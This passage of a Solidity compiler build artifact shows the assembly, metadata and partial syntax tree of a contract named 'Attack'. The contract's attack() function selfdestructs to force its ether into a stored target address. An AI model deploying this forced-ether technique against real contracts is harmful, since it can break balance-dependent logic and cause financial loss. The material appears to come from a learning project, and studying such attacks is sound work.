								},
								{
									"begin": 117,
									"end": 212,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 117,
									"end": 212,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 117,
									"end": 212,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 117,
									"end": 212,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 117,
									"end": 212,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 117,
									"end": 212,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 117,
									"end": 212,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 117,
									"end": 212,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 117,
									"end": 212,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 117,
									"end": 212,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 117,
									"end": 212,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 117,
									"end": 212,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 117,
									"end": 212,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 117,
									"end": 212,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 117,
									"end": 212,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 117,
									"end": 212,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 117,
									"end": 212,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 117,
									"end": 212,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 117,
									"end": 212,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 117,
									"end": 212,
									"name": "JUMP",
									"source": 0,
									"value": "[in]"
								},
								{
									"begin": 117,
									"end": 212,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 117,
									"end": 212,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 190,
									"end": 206,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 172,
									"end": 187,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 172,
									"end": 187,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 172,
									"end": 206,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 172,
									"end": 206,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 172,
									"end": 206,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 172,
									"end": 206,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 172,
									"end": 206,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 172,
									"end": 206,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 172,
									"end": 206,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 172,
									"end": 206,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 172,
									"end": 206,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 172,
									"end": 206,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 172,
									"end": 206,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 172,
									"end": 206,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 172,
									"end": 206,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 172,
									"end": 206,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 172,
									"end": 206,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 172,
									"end": 206,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 172,
									"end": 206,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 172,
									"end": 206,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 117,
									"end": 212,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 66,
									"end": 389,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "5"
								},
								{
									"begin": 66,
									"end": 389,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 7,
									"end": 150,
									"name": "tag",
									"source": 1,
									"value": "7"
								},
								{
									"begin": 7,
									"end": 150,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 64,
									"end": 69,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 95,
									"end": 101,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 89,
									"end": 102,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 80,
									"end": 102,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 80,
									"end": 102,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 111,
									"end": 144,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "9"
								},
								{
									"begin": 138,
									"end": 143,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 111,
									"end": 144,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 111,
									"end": 144,
									"name": "JUMP",
									"source": 1,
									"value": "[in]"
								},
								{
									"begin": 111,
									"end": 144,
									"name": "tag",
									"source": 1,
									"value": "9"
								},
								{
									"begin": 111,
									"end": 144,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 7,
									"end": 150,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 7,
									"end": 150,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 7,
									"end": 150,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 7,
									"end": 150,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 7,
									"end": 150,
									"name": "JUMP",
									"source": 1,
									"value": "[out]"
								},
								{
									"begin": 156,
									"end": 507,
									"name": "tag",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 156,
									"end": 507,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 226,
									"end": 232,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 275,
									"end": 277,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 263,
									"end": 272,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 254,
									"end": 261,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 250,
									"end": 273,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 246,
									"end": 278,
									"name": "SLT",
									"source": 1
								},
								{
									"begin": 243,
									"end": 362,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 243,
									"end": 362,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "12"
								},
								{
									"begin": 243,
									"end": 362,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 281,
									"end": 360,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "13"
								},
								{
									"begin": 281,
									"end": 360,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "14"
								},
								{
									"begin": 281,
									"end": 360,
									"name": "JUMP",
									"source": 1,
									"value": "[in]"
								},
								{
									"begin": 281,
									"end": 360,
									"name": "tag",
									"source": 1,
									"value": "13"
								},
								{
									"begin": 281,
									"end": 360,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 243,
									"end": 362,
									"name": "tag",
									"source": 1,
									"value": "12"
								},
								{
									"begin": 243,
									"end": 362,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 401,
									"end": 402,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 426,
									"end": 490,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "15"
								},
								{
									"begin": 482,
									"end": 489,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 473,
									"end": 479,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 462,
									"end": 471,
									"name": "DUP6",
									"source": 1
								},
								{
									"begin": 458,
									"end": 480,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 426,
									"end": 490,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "7"
								},
								{
									"begin": 426,
									"end": 490,
									"name": "JUMP",
									"source": 1,
									"value": "[in]"
								},
								{
									"begin": 426,
									"end": 490,
									"name": "tag",
									"source": 1,
									"value": "15"
								},
								{
									"begin": 426,
									"end": 490,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 416,
									"end": 490,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 416,
									"end": 490,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 372,
									"end": 500,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 156,
									"end": 507,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 156,
									"end": 507,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 156,
									"end": 507,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 156,
									"end": 507,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 156,
									"end": 507,
									"name": "JUMP",
									"source": 1,
									"value": "[out]"
								},
								{
									"begin": 594,
									"end": 690,
									"name": "tag",
									"source": 1,
									"value": "18"
								},
								{
									"begin": 594,
									"end": 690,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 631,
									"end": 638,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 660,
									"end": 684,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 678,
									"end": 683,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 660,
									"end": 684,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "21"
								},
								{
									"begin": 660,
									"end": 684,
									"name": "JUMP",
									"source": 1,
									"value": "[in]"
								},
								{
									"begin": 660,
									"end": 684,
									"name": "tag",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 660,
									"end": 684,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 649,
									"end": 684,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 649,
									"end": 684,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 594,
									"end": 690,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 594,
									"end": 690,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 594,
									"end": 690,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 594,
									"end": 690,
									"name": "JUMP",
									"source": 1,
									"value": "[out]"
								},
								{
									"begin": 696,
									"end": 822,
									"name": "tag",
									"source": 1,
									"value": "21"
								},
								{
									"begin": 696,
									"end": 822,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 733,
									"end": 740,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 773,
									"end": 815,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 766,
									"end": 771,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 762,
									"end": 816,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 751,
									"end": 816,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 751,
									"end": 816,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 822,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 696,
									"end": 822,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 696,
									"end": 822,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 822,
									"name": "JUMP",
									"source": 1,
									"value": "[out]"
								},
								{
									"begin": 951,
									"end": 1068,
									"name": "tag",
									"source": 1,
									"value": "14"
								},
								{
									"begin": 951,
									"end": 1068,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1060,
									"end": 1061,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 1057,
									"end": 1058,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 1050,
									"end": 1062,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 1074,
									"end": 1196,
									"name": "tag",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 1074,
									"end": 1196,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1147,
									"end": 1171,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "27"
								},
								{
									"begin": 1165,
									"end": 1170,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 1147,
									"end": 1171,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "18"
								},
								{
									"begin": 1147,
									"end": 1171,
									"name": "JUMP",
									"source": 1,
									"value": "[in]"
								},
								{
									"begin": 1147,
									"end": 1171,
									"name": "tag",
									"source": 1,
									"value": "27"
								},
								{
									"begin": 1147,
									"end": 1171,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1140,
									"end": 1145,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 1137,
									"end": 1172,
									"name": "EQ",
									"source": 1
								},
								{
									"begin": 1127,
									"end": 1190,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "28"
								},
								{
									"begin": 1127,
									"end": 1190,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 1186,
									"end": 1187,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 1183,
									"end": 1184,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 1176,
									"end": 1188,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 1127,
									"end": 1190,
									"name": "tag",
									"source": 1,
									"value": "28"
								},
								{
									"begin": 1127,
									"end": 1190,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1074,
									"end": 1196,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1074,
									"end": 1196,
									"name": "JUMP",
									"source": 1,
									"value": "[out]"
								},
								{
									"begin": 66,
									"end": 389,
									"name": "tag",
									"source": 0,
									"value": "5"
								},
								{
									"begin": 66,
									"end": 389,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 66,
									"end": 389,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 66,
									"end": 389,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 66,
									"end": 389,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 66,
									"end": 389,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 66,
									"end": 389,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 66,
									"end": 389,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 66,
									"end": 389,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220896463feb04b1ba95e2f12224930833b6c70c93a13052bcafc616746cc56558864736f6c63430008070033",
									".code": [
										{
											"begin": 66,
											"end": 389,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 66,
											"end": 389,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 66,
											"end": 389,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 66,
											"end": 389,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 66,
											"end": 389,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 66,
											"end": 389,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 66,
											"end": 389,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 66,
											"end": 389,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 66,
											"end": 389,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 66,
											"end": 389,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 66,
											"end": 389,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 66,
											"end": 389,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 66,
											"end": 389,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 66,
											"end": 389,
											"name": "PUSH",
											"source": 0,
											"value": "9E5FAAFC"
										},
										{
											"begin": 66,
											"end": 389,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 66,
											"end": 389,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 66,
											"end": 389,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 66,
											"end": 389,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 66,
											"end": 389,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 66,
											"end": 389,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 66,
											"end": 389,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 66,
											"end": 389,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 66,
											"end": 389,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 66,
											"end": 389,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 66,
											"end": 389,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 66,
											"end": 389,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 66,
											"end": 389,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 66,
											"end": 389,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 66,
											"end": 389,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 66,
											"end": 389,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 256,
											"end": 387,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 256,
											"end": 387,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 256,
											"end": 387,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 256,
											"end": 387,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 256,
											"end": 387,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 256,
											"end": 387,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 256,
											"end": 387,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 256,
											"end": 387,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 256,
											"end": 387,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 256,
											"end": 387,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 298,
											"end": 318,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 337,
											"end": 352,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 337,
											"end": 352,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 337,
											"end": 352,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 337,
											"end": 352,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 337,
											"end": 352,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 337,
											"end": 352,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 337,
											"end": 352,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 337,
											"end": 352,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 337,
											"end": 352,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 337,
											"end": 352,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 337,
											"end": 352,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 298,
											"end": 354,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 298,
											"end": 354,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 376,
											"end": 380,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 363,
											"end": 381,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 363,
											"end": 381,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 363,
											"end": 381,
											"name": "SELFDESTRUCT",
											"source": 0
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"attack()": "9e5faafc"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_registerAddress\",\"type\":\"address\"}],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"Code-hardhat-ethersJs/contracts/sc.sol\":\"Attack\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"Code-hardhat-ethersJs/contracts/sc.sol\":{\"keccak256\":\"0x95a0336d7702cd18e2c670e050fcc0bad6c8a8b0c3389313d36e9c89c38d311e\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://8f1391403223ece72de452ff67109db10421798a93d0c94232da99b9084bd6ea\",\"dweb:/ipfs/QmUSSmJt91EewLFyjXTfRUSVGHNnW4Y49tmXFgMPwiCFxq\"]}},\"version\":1}",
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"Code-hardhat-ethersJs/contracts/sc.sol": {
				"ast": {
					"absolutePath": "Code-hardhat-ethersJs/contracts/sc.sol",
					"exportedSymbols": {
						"Attack": [
							36
						]
					},
					"id": 37,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								">=",
								"0.7",
								".0",
								"<",
								"0.9",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "32:31:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 36,
							"linearizedBaseContracts": [
								36
							],
							"name": "Attack",
							"nameLocation": "75:6:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 3,
									"mutability": "mutable",
									"name": "registerAddress",
									"nameLocation": "95:15:0",
									"nodeType": "VariableDeclaration",
									"scope": 36,
									"src": "87:23:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 2,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "87:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 12,
										"nodeType": "Block",
										"src": "163:49:0",
										"statements": [
											{
												"expression": {
													"id": 10,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 8,
														"name": "registerAddress",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 3,
														"src": "172:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 9,
														"name": "_registerAddress",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "190:16:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "172:34:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 11,
												"nodeType": "ExpressionStatement",
												"src": "172:34:0"
											}
										]
									},
									"id": 13,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 6,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 5,
												"mutability": "mutable",
												"name": "_registerAddress",
												"nameLocation": "137:16:0",
												"nodeType": "VariableDeclaration",
												"scope": 13,
												"src": "129:24:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 4,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "129:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "128:26:0"
									},
									"returnParameters": {
										"id": 7,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "163:0:0"
									},
									"scope": 36,
									"src": "117:95:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 16,
										"nodeType": "Block",
										"src": "245:2:0",
										"statements": []
									},
									"id": 17,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 14,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "225:2:0"
									},
									"returnParameters": {
										"id": 15,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "245:0:0"
									},
									"scope": 36,
									"src": "218:29:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": {
										"id": 34,
										"nodeType": "Block",
										"src": "289:98:0",
										"statements": [
											{
												"assignments": [
													21
												],
												"declarations": [
													{
														"constant": false,
														"id": 21,
														"mutability": "mutable",
														"name": "addr",
														"nameLocation": "314:4:0",
														"nodeType": "VariableDeclaration",
														"scope": 34,
														"src": "298:20:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														},
														"typeName": {
															"id": 20,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "298:15:0",
															"stateMutability": "payable",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 29,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"id": 26,
																	"name": "registerAddress",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 3,
																	"src": "337:15:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 25,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "329:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 24,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "329:7:0",
																	"typeDescriptions": {}
																}
															},
															"id": 27,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "329:24:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 23,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "321:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_address_payable_$",
															"typeString": "type(address payable)"
														},
														"typeName": {
															"id": 22,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "321:8:0",
															"stateMutability": "payable",
															"typeDescriptions": {}
														}
													},
													"id": 28,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "321:33:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "298:56:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 31,
															"name": "addr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 21,
															"src": "376:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														],
														"id": 30,
														"name": "selfdestruct",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 4294967275,
														"src": "363:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_selfdestruct_nonpayable$_t_address_payable_$returns$__$",
															"typeString": "function (address payable)"
														}
													},
													"id": 32,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "363:18:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 33,
												"nodeType": "ExpressionStatement",
												"src": "363:18:0"
											}
										]
									},
